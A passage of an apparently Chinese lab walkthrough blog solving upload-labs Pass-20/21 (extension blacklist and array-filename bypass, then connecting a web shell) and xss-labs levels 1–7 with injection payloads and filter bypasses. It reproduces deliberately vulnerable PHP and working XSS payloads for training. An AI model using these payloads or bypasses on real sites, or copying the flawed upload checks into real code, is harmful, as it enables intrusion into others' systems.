src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021955741.png"></p><p>接下来同18关</p><h3 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>);<br><br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>];<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file_name</span>,PATHINFO_EXTENSION);<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> .<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123; <br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;禁止保存为该类型文件！&#x27;</span>;<br>        &#125;<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021955415.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021955515.png"></p><h3 id="Pass-21"><a href="#Pass-21" class="headerlink" title="Pass-21"></a>Pass-21</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>]))&#123;<br>    <span class="hljs-comment">//检查MIME</span><br>    <span class="hljs-variable">$allow_type</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;image/jpeg&#x27;</span>,<span class="hljs-string">&#x27;image/png&#x27;</span>,<span class="hljs-string">&#x27;image/gif&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>],<span class="hljs-variable">$allow_type</span>))&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;禁止上传该类型文件!&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">//检查文件名</span><br>        <span class="hljs-variable">$file</span> = <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>]) ? <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>] : <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$file</span>)) &#123;<br>            <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file</span>));<br>        &#125;<br><br>        <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$file</span>);<br>        <span class="hljs-variable">$allow_suffix</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>, <span class="hljs-variable">$allow_suffix</span>)) &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;禁止上传该后缀文件!&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable">$file</span>) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$file</span>[<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$file</span>) - <span class="hljs-number">1</span>];<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> .<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;文件上传成功！&quot;</span>;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;文件上传失败！&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;请选择要上传的文件！&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果传入的内容是数组，那他不会进行检查，同时把数组中的第一个元素和最后一个元素通过点拼接成一个完整的文件名。</p><p>如果传入的内容不是数组，他会以点为分割，把名字和后缀分开，形成一个数组，数组中的第一个元素为文件名字，第二个元素为后缀名，再接着，它会对你数组中最后一个元素（也就是第二个元素后缀名）进行判断，如果不符合白名单上的内容，那就直接禁止了，如果允许，他会让数组中的第一个元素与最后一个元素通过点来结合，形成一个完整的文件名。</p><p>一切的根源都是保存的名称是不是数组，所以我们只需要伪造一个数组</p><p>首先上传php文件</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021955560.png"></p><p>修改这一段</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021955963.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021955255.png"></p><p>更改完之后放包，上传成功</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021955086.png"></p><p>使用蚁剑链接</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021955778.png"></p><h1 id="2、xss-labs"><a href="#2、xss-labs" class="headerlink" title="2、xss-labs"></a>2、xss-labs</h1><p>XSS 的核心原理是 <strong>攻击者通过输入恶意脚本，利用网站未过滤的漏洞，让浏览器执行这些脚本，从而实施攻击</strong>。</p><h4 id="level1-直接注入"><a href="#level1-直接注入" class="headerlink" title="level1_直接注入"></a>level1_直接注入</h4><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021955481.png"></p><p>查看源码：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021956284.png"></p><p>当调用 <code>alert()</code> 时，实际上会执行以下操作：</p><ol><li>弹出一个确认对话框，显示消息“完成的不错！”。</li><li>用户点击确认后，页面会重定向到 <code>level2.php</code>，并且传递一个查询参数 <code>keyword=test</code>。</li></ol><p>直接在地址栏输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">name=&lt;script&gt;alert()&lt;/script&gt;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021956277.png"></p><h4 id="level2-”-闭合绕过"><a href="#level2-”-闭合绕过" class="headerlink" title="level2_”&gt;闭合绕过"></a>level2_”&gt;闭合绕过</h4><p>先插入js尝试</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021956109.png"></p><p>这里属于特殊符号被实体转义，所以<code>&lt;script&gt;alert()&lt;/script&gt;</code>没有被实体转移</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021956812.png"></p><p>可以看到<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>被嵌套到value属性中，所以我们需要闭合input标签。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">payload：<br>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021957776.png"></p><h4 id="level3-onfocus和οnclick"><a href="#level3-onfocus和οnclick" class="headerlink" title="level3_onfocus和οnclick"></a>level3_onfocus和οnclick</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level4.php?keyword=try harder!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level3<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level3<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level3.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;&#x27;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">搜索</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level3.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:0<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>尝试闭合单引号</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021957476.png"></p><p>查看源代码</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021957990.png"></p><p><code>htmlspecialchars()</code> 是 PHP 中用于将特殊字符转换为 HTML 实体的核心安全函数，主要用于防止 XSS（跨站脚本攻击）并确保内容在 HTML 中正确显示。</p><hr><table><thead><tr><th align="center">原字符</th><th align="center">正确转换后的 HTML 实体</th><th align="center">触发条件</th></tr></thead><tbody><tr><td align="center"><code>&amp;</code></td><td align="center"><code>&amp;</code></td><td align="center"><strong>始终转换</strong></td></tr><tr><td align="center"><code>&quot;</code></td><td align="center"><code>&quot;</code></td><td align="center">默认（<code>ENT_COMPAT</code>）或 <code>ENT_QUOTES</code></td></tr><tr><td align="center"><code>&#39;</code></td><td align="center"><code>&#39;</code>（或 <code>&#39;</code>*）</td><td align="center"><strong>仅当设置 <strong><code>ENT_QUOTES</code></strong> 时</strong></td></tr><tr><td align="center"><code>&lt;</code></td><td align="center"><code>&lt;</code></td><td align="center"><strong>始终转换</strong></td></tr><tr><td align="center"><code>&gt;</code></td><td align="center"><code>&gt;</code></td><td align="center"><strong>始终转换</strong></td></tr></tbody></table><p>使用 htmlspecialchars 函数对 $str 进行转义</p><p>利用onfocus事件绕过</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&#x27; onfocus=javascript:alert()‘</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021957196.png"></p><p>利用onclick事件绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&#x27; οnclick=&#x27;javascript:alert()&#x27;<br></code></pre></td></tr></table></figure><h4 id="level4-onfocus和οnclick"><a href="#level4-onfocus和οnclick" class="headerlink" title="level4_onfocus和οnclick"></a>level4_onfocus和οnclick</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&quot; onfocus=javascript:alert() &quot;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021957997.png"></p><h4 id="level5-a-href标签法"><a href="#level5-a-href标签法" class="headerlink" title="level5_a href标签法"></a>level5_<strong>a href标签法</strong></h4><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021957242.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021958585.png"></p><p>分析源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level5.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str3</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level5.png&gt;&lt;/center&gt;<br><br><span class="hljs-meta">&lt;?php</span> <br></code></pre></td></tr></table></figure><ul><li>strtolower()函数用于将字符串中的所有大写字母转换为小写字母。非字母字符（如数字、符号、中文等）不受影响。</li><li>str_replace()函数，用于在字符串中查找并替换指定的内容。</li></ul><p>这里我们使用<strong>a href标签法</strong></p><p><a href="https://www.w3school.com.cn/tags/index.asp">HTML 标签参考手册</a></p><p>关于 HTML 中 <code>&lt;a&gt;</code> 标签（超链接）的 <code>href</code> 属性用法：<a href="https://www.w3school.com.cn/tags/tag_a.asp">HTML  标签_</a></p><p><code>href</code>属性的意思是：当标签<code>&lt;a&gt;</code>被点击的时候，就会触发执行跳转，跳转到一个网站，还可以触发执行一段js代码。</p><p><strong>基础语法</strong></p><p><code>&lt;a&gt;</code> 标签通过 <code>href</code> 属性定义链接目标，基本格式如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;目标地址&quot;</span>&gt;</span>链接文本或元素<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><br></code></pre></td></tr></table></figure><ul><li><strong>点击元素</strong>：可以是文本、图片或其他 HTML 内容。</li><li><strong>行为</strong>：点击后默认在当前页面跳转（可通过 <code>target</code> 属性控制）。</li></ul><p>添加一个标签得闭合前面的标签，构建payload：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&quot;&gt; <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> &lt;&quot;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021958768.png"></p><p>之后点击<code>xxx</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021958450.png"></p><h4 id="level6-大写绕过"><a href="#level6-大写绕过" class="headerlink" title="level6_大写绕过"></a>level6_大写绕过</h4><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021958703.png"></p><p>检查源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<span class="hljs-comment">//绕过js标签</span><br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<span class="hljs-comment">//绕过onfocus事件</span><br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,<span class="hljs-variable">$str5</span>);<span class="hljs-comment">//绕过a href标签</span><br></code></pre></td></tr></table></figure><p>没有添加小写转化函数 ，我们使用大写绕过：</p><p>构建payload：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html">&quot;&gt; <span class="hljs-tag">&lt;<span class="hljs-name">sCript</span>&gt;</span>alert()<span class="hljs-tag">&lt;/<span class="hljs-name">sCript</span>&gt;</span> &lt;&quot;<br><br>&quot; Onfocus=javascript:alert() &quot;<br><br>&quot;&gt; <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">hRef</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span>x<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> &lt;&quot;<br></code></pre></td></tr></table></figure><p>三种都可以通关</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021958610.png"></p><h4 id="level7-双写绕过"><a href="#level7-双写绕过" class="headerlink" title="level7_双写绕过"></a>level7_双写绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$str</span> =<span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<span class="hljs-comment">//大写转小写</span><br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str</span>);<span class="hljs-comment">//过滤js标签</span><br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str2</span>);<span class="hljs-comment">//过滤onfocus标签</span><br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str5</span>);<span class="hljs-comment">//过滤a href标签</span><br></code></pre></td></tr></table></figure><p>出现了俩个没见过东西：</p><p><a href="https://www.w3school.com.cn/tags/index.asp">HTML 标签参考手册</a></p><p><code>src(source)</code>:<a href="https://www.w3school.com.cn/tags/tag_source.asp">HTML  标签_source</a></p><p>标签用于为媒体元素（视频&#x2F;音频&#x2F;图像）指定多个媒体资源。</p><p><code>data</code>:（level6也有）<a href="https://www.w3school.com.cn/tags/tag_data.asp">HTML  